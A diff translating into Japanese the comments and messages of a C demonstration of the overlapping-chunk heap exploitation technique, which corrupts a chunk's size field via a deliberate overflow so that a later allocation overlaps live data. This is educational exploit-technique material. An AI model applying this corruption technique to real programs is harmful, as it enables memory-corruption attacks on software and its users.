@@ -1,10 +1,10 @@
 /*
- Yet another simple tale of overlapping chunk.
+ オーバーラップするチャンク(overlapping chunk)についての、もうひとつの簡単な話です。
 
- This technique is taken from
+ この手法は、次の資料から取っています。
  https://loccs.sjtu.edu.cn/wiki/lib/exe/fetch.php?media=gossip:overview:ptmalloc_camera.pdf.
  
- This is also referenced as Nonadjacent Free Chunk Consolidation Attack.
+ これは Nonadjacent Free Chunk Consolidation Attack(隣接しない空きチャンクの統合攻撃)とも呼ばれます。
 
 */
 
@@ -20,9 +20,9 @@ int main(){
   unsigned int real_size_p1,real_size_p2,real_size_p3,real_size_p4,real_size_p5,real_size_p6;
   int prev_in_use = 0x1;
 
-  fprintf(stderr, "\nThis is a simple chunks overlapping problem");
-  fprintf(stderr, "\nThis is also referenced as Nonadjacent Free Chunk Consolidation Attack\n");
-  fprintf(stderr, "\nLet's start to allocate 5 chunks on the heap:");
+  fprintf(stderr, "\nこれは、チャンクがオーバーラップするという単純な問題です");
+  fprintf(stderr, "\nこれは Nonadjacent Free Chunk Consolidation Attack(隣接しない空きチャンクの統合攻撃)とも呼ばれます\n");
+  fprintf(stderr, "\nまず、ヒープ上に5つのチャンク(chunk)を割り当てましょう:");
 
   p1 = malloc(1000);
   p2 = malloc(1000);
@@ -36,11 +36,11 @@ int main(){
   real_size_p4 = malloc_usable_size(p4);
   real_size_p5 = malloc_usable_size(p5);
 
-  fprintf(stderr, "\n\nchunk p1 from %p to %p", p1, (unsigned char *)p1+malloc_usable_size(p1));
-  fprintf(stderr, "\nchunk p2 from %p to %p", p2,  (unsigned char *)p2+malloc_usable_size(p2));
-  fprintf(stderr, "\nchunk p3 from %p to %p", p3,  (unsigned char *)p3+malloc_usable_size(p3));
-  fprintf(stderr, "\nchunk p4 from %p to %p", p4, (unsigned char *)p4+malloc_usable_size(p4));
-  fprintf(stderr, "\nchunk p5 from %p to %p\n", p5,  (unsigned char *)p5+malloc_usable_size(p5));
+  fprintf(stderr, "\n\nチャンク p1: %p から %p まで", p1, (unsigned char *)p1+malloc_usable_size(p1));
+  fprintf(stderr, "\nチャンク p2: %p から %p まで", p2,  (unsigned char *)p2+malloc_usable_size(p2));
+  fprintf(stderr, "\nチャンク p3: %p から %p まで", p3,  (unsigned char *)p3+malloc_usable_size(p3));
+  fprintf(stderr, "\nチャンク p4: %p から %p まで", p4, (unsigned char *)p4+malloc_usable_size(p4));
+  fprintf(stderr, "\nチャンク p5: %p から %p まで\n", p5,  (unsigned char *)p5+malloc_usable_size(p5));
 
   memset(p1,'A',real_size_p1);
   memset(p2,'B',real_size_p2);
@@ -48,34 +48,34 @@ int main(){
   memset(p4,'D',real_size_p4);
   memset(p5,'E',real_size_p5);
   
-  fprintf(stderr, "\nLet's free the chunk p4.\nIn this case this isn't coealesced with top chunk since we have p5 bordering top chunk after p4\n"); 
+  fprintf(stderr, "\nチャンク p4 を解放(free)しましょう。\nこの場合、p4 の後ろにtop chunkと接する p5 があるため、p4 はtop chunkと統合(coalesce)されません\n"); 
   
   free(p4);
 
-  fprintf(stderr, "\nLet's trigger the vulnerability on chunk p1 that overwrites the size of the in use chunk p2\nwith the size of chunk_p2 + size of chunk_p3\n");
+  fprintf(stderr, "\nチャンク p1 の脆弱性を発動させて、使用中のチャンク p2 のサイズを\nチャンク p2 のサイズ + チャンク p3 のサイズで上書きしましょう\n");
 
   *(unsigned int *)((unsigned char *)p1 + real_size_p1 ) = real_size_p2 + real_size_p3 + prev_in_use + sizeof(size_t) * 2; //<--- BUG HERE 
 
-  fprintf(stderr, "\nNow during the free() operation on p2, the allocator is fooled to think that \nthe nextchunk is p4 ( since p2 + size_p2 now point to p4 ) \n");
-  fprintf(stderr, "\nThis operation will basically create a big free chunk that wrongly includes p3\n");
+  fprintf(stderr, "\nこれで、p2 に対する free() の処理中に、アロケータは \n次のチャンク(nextchunk)が p4 であると騙されます( p2 + size_p2 が p4 を指すようになったためです ) \n");
+  fprintf(stderr, "\nこの操作により、p3 を誤って含む大きな空きチャンクが作られます\n");
   free(p2);
   
-  fprintf(stderr, "\nNow let's allocate a new chunk with a size that can be satisfied by the previously freed chunk\n");
+  fprintf(stderr, "\n次に、先ほど解放したチャンクで満たせるサイズの新しいチャンクを割り当てましょう\n");
 
   p6 = malloc(2000);
   real_size_p6 = malloc_usable_size(p6);
 
-  fprintf(stderr, "\nOur malloc() has been satisfied by our crafted big free chunk, now p6 and p3 are overlapping and \nwe can overwrite data in p3 by writing on chunk p6\n");
-  fprintf(stderr, "\nchunk p6 from %p to %p", p6,  (unsigned char *)p6+real_size_p6);
-  fprintf(stderr, "\nchunk p3 from %p to %p\n", p3, (unsigned char *) p3+real_size_p3); 
+  fprintf(stderr, "\nmalloc() は、私たちが作り込んだ大きな空きチャンクで満たされました。これで p6 と p3 がオーバーラップしており、 \nチャンク p6 に書き込むことで p3 内のデータを上書きできます\n");
+  fprintf(stderr, "\nチャンク p6: %p から %p まで", p6,  (unsigned char *)p6+real_size_p6);
+  fprintf(stderr, "\nチャンク p3: %p から %p まで\n", p3, (unsigned char *) p3+real_size_p3); 
 
-  fprintf(stderr, "\nData inside chunk p3: \n\n");
+  fprintf(stderr, "\nチャンク p3 内のデータ: \n\n");
   fprintf(stderr, "%s\n",(char *)p3); 
 
-  fprintf(stderr, "\nLet's write something inside p6\n");
+  fprintf(stderr, "\np6 の中に何か書き込みましょう\n");
   memset(p6,'F',1500);  
   
-  fprintf(stderr, "\nData inside chunk p3: \n\n");
+  fprintf(stderr, "\nチャンク p3 内のデータ: \n\n");
   fprintf(stderr, "%s\n",(char *)p3); 
 
 
